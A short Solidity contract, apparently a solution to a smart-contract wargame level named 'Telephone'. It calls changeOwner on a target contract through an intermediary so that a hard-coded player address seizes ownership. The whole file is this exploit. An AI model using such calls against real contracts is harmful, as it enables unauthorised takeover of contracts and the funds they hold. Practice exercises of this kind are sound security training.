// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract CallTelephone {
    event CalledTelephone(bool success, bytes data);

    address constant PLAYER_ADDRESS = 0x2Ba62a52b9244b4E45Ba52cc0B1f8D39B522025D;

    function callTelephone(address _addr) external {
        (bool succ, bytes memory data) = _addr.call(abi.encodeWithSignature("changeOwner(address)", PLAYER_ADDRESS));
        emit CalledTelephone(succ, data);
    }
}